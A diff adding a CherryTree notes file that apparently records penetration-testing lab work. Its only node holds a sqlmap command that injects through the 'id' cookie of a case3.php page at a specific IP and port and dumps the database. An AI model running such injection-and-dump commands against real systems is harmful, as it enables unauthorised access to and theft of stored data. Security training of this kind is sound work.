@@ -1,0 +1,9 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<cherrytree>
+  <node unique_id="81" master_id="0" name="in cookie" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1767015986" ts_lastsave="1767016001">
+    <rich_text>sqlmap "</rich_text>
+    <rich_text link="webs http://94.237.55.124:45986/case3.php">http://94.237.55.124:45986/case3.php</rich_text>
+    <rich_text>" --cookie="id=1*" --dump&#13;
+</rich_text>
+  </node>
+</cherrytree>
